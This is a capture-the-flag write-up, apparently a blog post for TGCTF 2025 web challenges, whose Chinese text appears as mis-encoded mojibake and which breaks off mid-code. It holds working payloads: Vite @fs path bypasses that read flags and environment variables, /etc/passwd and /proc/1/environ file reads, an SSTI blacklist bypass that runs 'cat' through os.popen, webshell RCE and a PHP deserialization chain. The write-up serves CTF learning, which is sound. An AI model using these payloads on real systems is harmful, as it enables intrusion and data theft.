        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-04-14 00:00:00" itemprop="dateCreated datePublished" datetime="2025-04-14T00:00:00+08:00">2025-04-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-06-29 17:25:31" itemprop="dateModified" datetime="2025-06-29T17:25:31+08:00">2025-06-29</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="AAAå·æ¸¡é˜´å¹³"><a href="#AAAå·æ¸¡é˜´å¹³" class="headerlink" title="AAAå·æ¸¡é˜´å¹³"></a><strong>AAAå·æ¸¡é˜´å¹³</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <span class="meta">?&gt;</span></span><br><span class="line">------WebKitFormBoundaryU4VFMZ4wbU2hEGvg</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">------WebKitFormBoundaryU4VFMZ4wbU2hEGvg--</span><br></pre></td></tr></table></figure>

<h2 id="å‰ç«¯GAME"><a href="#å‰ç«¯GAME" class="headerlink" title="å‰ç«¯GAME"></a><strong>å‰ç«¯GAME</strong></h2><p>è¿›å»æ˜¯ä¸ªå°æ¸¸æˆ æœ¬æ¥ä»¥ä¸ºæ˜¯æ­£å¸¸æ€è·¯ ä½†æ˜¯æ€ä¹ˆéƒ½åšä¸å‡º äºæ˜¯é¢˜ç›®æ˜¯ä¸ªvueæ¡†æ¶çš„æ¸¸æˆ äºæ˜¯æœç´¢ å‘ç°æœ‰å…³äºè¿™ä¸ªçš„æ¼æ´</p>
<p>æ¼æ´æ–‡ç« :<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17655">Viteå¼€å‘æœåŠ¡å™¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æå¤ç°ï¼ˆCVE-2025-31125ï¼‰-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p><a target="_blank" rel="noopener" href="https://www.panziye.com/front/16376.html">Viteå­˜åœ¨CVE-2025-30208å®‰å…¨æ¼æ´ï¼ˆé™„ä¿®å¤æ–¹æ¡ˆå’Œæ¼”ç¤ºç¤ºä¾‹)</a></p>
<h3 id="Viteæ¼æ´åŸç†"><a href="#Viteæ¼æ´åŸç†" class="headerlink" title="Viteæ¼æ´åŸç†"></a>Viteæ¼æ´åŸç†</h3><p>Viteåœ¨å¼€å‘æœåŠ¡å™¨æ¨¡å¼ä¸‹ï¼Œæä¾›äº†<code>@fs</code>åŠŸèƒ½ï¼ŒåŸæœ¬æ˜¯ä¸ºäº†è®©å¼€å‘è€…è®¿é—®æœåŠ¡å…è®¸èŒƒå›´å†…çš„æ–‡ä»¶ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœè¯·æ±‚çš„æ–‡ä»¶è¶…å‡ºäº†è¿™ä¸ªå…è®¸èŒƒå›´ï¼ŒViteåº”è¯¥è¿”å›â€œ403 Restrictedâ€ï¼Œæç¤ºè®¿é—®å—é™ã€‚ä½†æ”»å‡»è€…å‘ç°äº†ä¸€ä¸ªâ€œæ¼æ´â€ï¼Œå½“åœ¨è¯·æ±‚URLä¸­æ·»åŠ <code>?raw??</code>æˆ–<code>?import&amp;raw??</code>è¿™æ ·çš„ç‰¹æ®Šå‚æ•°æ—¶ï¼Œå°±èƒ½ç»•è¿‡åŸæœ¬çš„æ–‡ä»¶è®¿é—®é™åˆ¶æ£€æŸ¥ã€‚</p>
<p>åŸå› ï¼šViteåœ¨å¤„ç†è¯·æ±‚çš„å¤šä¸ªç¯èŠ‚ä¸­ï¼Œä¼šç§»é™¤ç±»ä¼¼<code>?</code>çš„ç»“å°¾åˆ†éš”ç¬¦ï¼Œä½†åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²çš„æ­£åˆ™åŒ¹é…è¿‡ç¨‹ä¸­ï¼Œå´æ²¡æœ‰è€ƒè™‘åˆ°è¿™ç§ç‰¹æ®Šæƒ…å†µï¼Œè¿™å°±ç»™æ”»å‡»è€…å¯ä¹˜ä¹‹æœºï¼Œä»–ä»¬åˆ©ç”¨è¿™ä¸ªç¼ºé™·ï¼Œ<strong>å°±èƒ½è¯»å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹</strong>ã€‚</p>
<h3 id="é¢˜ç›®è§£æ³•"><a href="#é¢˜ç›®è§£æ³•" class="headerlink" title="é¢˜ç›®è§£æ³•"></a>é¢˜ç›®è§£æ³•</h3><p>ç›´æ¥æŒ‰ç…§ä»–ç»™çš„payload <code>/@fs/tgflagggg?import&amp;raw??</code></p>
<h2 id="å‰ç«¯GAME-Plus"><a href="#å‰ç«¯GAME-Plus" class="headerlink" title="å‰ç«¯GAME Plus"></a><strong>å‰ç«¯GAME Plus</strong></h2><p>ä¸Šä¸€é“é¢˜çš„payloadä¸å¯è¡Œäº†</p>
<p>æ–‡ç« æœªå…¬å¼€çš„poc:å¯ä»¥é€šè¿‡svgæ¥è¿›è¡Œæ–‡ä»¶è¯»å– <code>/@fs/tgflagggg?import&amp;?meteorkai.svg?.wasm?init</code></p>
<p><img src="/images/image-20250414204645766.png" alt="image-20250414204645766"></p>
<p>å¾—åˆ°VEdDVEZ7ZmUxM2MzZGYtYzNkNC1hYjJhLTQwZjYtNjNjYjM1MzczNjAyfQo&#x3D;</p>
<p>base64è§£ç  TGCTF{fe13c3df-c3d4-ab2a-40f6-63cb35373602}</p>
<h2 id="å‰ç«¯GAME-Ultra"><a href="#å‰ç«¯GAME-Ultra" class="headerlink" title="å‰ç«¯GAME Ultra"></a><strong>å‰ç«¯GAME Ultra</strong></h2><p>plusçš„payloadä¹Ÿä¸å¯ä»¥</p>
<p><code>/@fs/app#/../proc/self/environ</code>è¯»ç¯å¢ƒå˜é‡</p>
<p>ä¹Ÿå¯ä»¥ <code>/@fs/app/vite-project/#/../../../../../tgflagggg</code></p>
<h2 id="ç›´é¢å¤©å‘½"><a href="#ç›´é¢å¤©å‘½" class="headerlink" title="ç›´é¢å¤©å‘½"></a><strong>ç›´é¢å¤©å‘½</strong></h2><p>è®¿é—®&#x2F;hint æç¤ºæ˜¯ä¸€ä¸ªå››ä¸ªå°å†™è‹±æ–‡å­—æ¯çš„è·¯ç”± çˆ†å‡ºæ¥æ˜¯&#x2F;aazzè·¯ç”±</p>
<p>è¿›å»f12 çœ‹åˆ°è¯´æ˜¯å¯ä»¥ä¼ å‚æ•° butä¸çŸ¥é“å‚æ•°æ˜¯ä»€ä¹ˆ é‚£å°±arjunçˆ†ç ´å§ çˆ†å‡ºæ¥æ˜¯filename</p>
<p>çœ‹åˆ°fillenameå‚æ•° ä¸€èˆ¬ä¼šè€ƒè™‘åˆ°ssrf å°±åƒnameæ˜¯sstiä¸€æ ·</p>
<p>ä¼ å…¥<code>?filename=/etc/passwd</code></p>
<p>å¯ä»¥è¯»å– å°è¯•è¯»å–ç¯å¢ƒå˜é‡</p>
<p><code>?filename=/proc/1/environ</code> </p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥è¯»&#x2F;flag</p>
<h2 id="ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰"><a href="#ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰" class="headerlink" title="ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰"></a><strong>ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory</span><br><span class="line"><span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;_.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="comment"># å®šä¹‰å¯é€šè¿‡æ ‡å‡† QWERTY é”®ç›˜è¾“å…¥çš„å­—ç¬¦é›†</span></span><br><span class="line">    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace</span><br><span class="line">    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>():</span><br><span class="line">    template1=<span class="string">&quot;&quot;</span></span><br><span class="line">    template2=<span class="string">&quot;&quot;</span></span><br><span class="line">    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> waf(name):</span><br><span class="line">        template = <span class="string">&#x27;æƒ³å¹²åäº‹äº†æ˜¯å§hackerï¼Ÿå“¼ï¼Œè¿˜å¤©å‘½äººï¼Œå¯ç¬‘ï¼Œå¯æ‚²ï¼Œå¯å¹</span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">if</span> is_typable(i):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            k=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (secret_key[:<span class="number">2</span>] <span class="keyword">in</span> name <span class="keyword">and</span> secret_key[<span class="number">2</span>:]):</span><br><span class="line">                template = <span class="string">&#x27;è¿â€œå…­æ ¹â€éƒ½å‡‘ä¸é½ï¼Œè°ˆä»€ä¹ˆå¤©å‘½ä¸å¤©å‘½çš„ï¼Œè¿˜æ˜¯æˆ´ä¸Šè¿™é‡‘ç®å§</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å†å»è¥¿è¡Œå†ç»ƒå†ç»ƒ</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">            template1 = <span class="string">&quot;â€œå…­æ ¹â€ä¹Ÿå‡‘é½äº†ï¼Œä½ å·²ç»å¯ä»¥ç›´é¢å¤©å‘½äº†ï¼æˆ‘å¸®ä½ æŠŠâ€œsecret_keyâ€æ›¿æ¢ä¸ºäº†â€œ&#123;&#123;&#125;&#125;â€</span></span><br><span class="line"><span class="string">æœ€åï¼Œå¦‚æœä½ ç”¨äº†catï¼Œå°±å¯ä»¥è§åˆ°é½å¤©å¤§åœ£äº†</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">            template= template.replace(<span class="string">&quot;å¤©å‘½&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>).replace(<span class="string">&quot;éš¾è¿&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>)</span><br><span class="line">            template = template</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">in</span> template:</span><br><span class="line">        template2 = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">æˆ–è®¸ä½ è¿™åªå«å¤©å‘½äººçš„çŒ´å­ï¼ŒçœŸçš„èƒ½åšåˆ°ï¼Ÿ</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template1+render_template_string(template)+render_template_string(template2)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="string">f&quot;500æŠ¥é”™äº†ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="string"><span class="subst">&#123;template&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> error_message, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hinter</span>():</span><br><span class="line">    template=<span class="string">&quot;hintï¼š</span></span><br><span class="line"><span class="string">æœ‰ä¸€ä¸ªaazzè·¯ç”±ï¼Œå»é‚£é‡Œçœ‹çœ‹å§ï¼Œå¤©å‘½äºº!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aazz&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">finder</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        source_code = f.read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;</span></span><br><span class="line"><span class="string"><span class="subst">&#123;source_code&#125;</span></span></span><br><span class="line"><span class="string">&quot;</span>, <span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡æºç  é»‘åå•</p>
<p><code>black_list=[&#39;lipsum&#39;,&#39;|&#39;,&#39;%&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;map&#39;,&#39;chr&#39;, &#39;value&#39;, &#39;get&#39;, &quot;url&quot;, &#39;pop&#39;,&#39;include&#39;,&#39;popen&#39;,&#39;os&#39;,&#39;import&#39;,&#39;eval&#39;,&#39;_&#39;,&#39;system&#39;,&#39;read&#39;,&#39;base&#39;,&#39;globals&#39;,&#39;_.&#39;,&#39;set&#39;,&#39;application&#39;,&#39;getitem&#39;,&#39;request&#39;, &#39;+&#39;, &#39;init&#39;, &#39;arg&#39;, &#39;config&#39;, &#39;app&#39;, &#39;self&#39;]</code></p>
<p>æŠŠ{}banäº† ä½†æ˜¯å¤©å‘½å’Œéš¾è¿å¯ä»¥æ›¿æ¢ä¸º</p>
<p>æ‰€ä»¥ç›´æ¥æŒ‰ç…§é»‘åå• æ‰“sstiå°±å¯</p>
<p>æœ€åpayload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¤©å‘½((g[<span class="string">&#x27;p&#x27;</span><span class="string">&#x27;op&#x27;</span>][<span class="string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&quot;</span>](<span class="string">&#x27;o&#x27;</span><span class="string">&#x27;s&#x27;</span>))[<span class="string">&#x27;p&#x27;</span><span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;cat /t*&#x27;</span>))[<span class="string">&#x27;r&#x27;</span><span class="string">&#x27;ead&#x27;</span>]()éš¾è¿</span><br></pre></td></tr></table></figure>

<h2 id="ç«çœ¼è¾©é­‘é­…"><a href="#ç«çœ¼è¾©é­‘é­…" class="headerlink" title="ç«çœ¼è¾©é­‘é­…"></a><strong>ç«çœ¼è¾©é­‘é­…</strong></h2><p>è¿›å»dirsearchæ‰«æç½‘ç«™ çœ‹åˆ°robots.txt è®¿é—®å¾—åˆ°å¾ˆå¤šè·¯ç”± è¯´æ˜¯åªæœ‰ä¸€ä¸ªèƒ½åˆ°</p>
<p>ç›´æ¥åˆ°&#x2F;tgshell.phpæ‰“rceå³å¯</p>
<p>postä¼ å…¥Â· <code>shell=print \</code>cat &#x2F;t*`;&#96;</p>
<p><img src="/images/image-20250414134522190.png" alt="image-20250414134522190"></p>
<p>å› ä¸ºæ˜¯ä¸€å¥è¯æœ¨é©¬ ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨èšå‰‘è¿æ¥ ç„¶åä¹Ÿå¯å¾—åˆ°flag</p>
<h2 id="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ"><a href="#ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ"></a><strong>ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ</strong></h2><p>è¿›å»æ˜¯æ–‡ä»¶ä¸Šä¼  å‘ç°ä¼ ä»€ä¹ˆéƒ½è¢«ban äºæ˜¯dirsearchäº†ä¸€ä¸‹ç½‘ç«™ robots.txté‡Œæœ‰ä¸œè¥¿</p>
<p>[å›¾ç‰‡]</p>
<p>è®¿é—®&#x2F;class.php å‘ç°æ˜¯æ˜¯ååºåˆ—åŒ–å¹¶ä¸”æœ‰æ¼æ´ç‚¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">best64_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>)))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$learn</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$study</span>=<span class="string">&quot;study&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;learn = <span class="string">&quot;learn&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;study-&gt;<span class="title function_ invoke__">hard</span>();     <span class="comment">//1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$done</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;did = <span class="string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;done = <span class="string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;done;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;doing))==<span class="number">666</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doing</span>();                 </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;doing-&gt;better;      <span class="comment">//2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">tommoraw</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$bad</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$soso</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;good=<span class="string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;good;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bad=<span class="string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">future</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$impossible</span>=<span class="string">&quot;How can you get here?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span 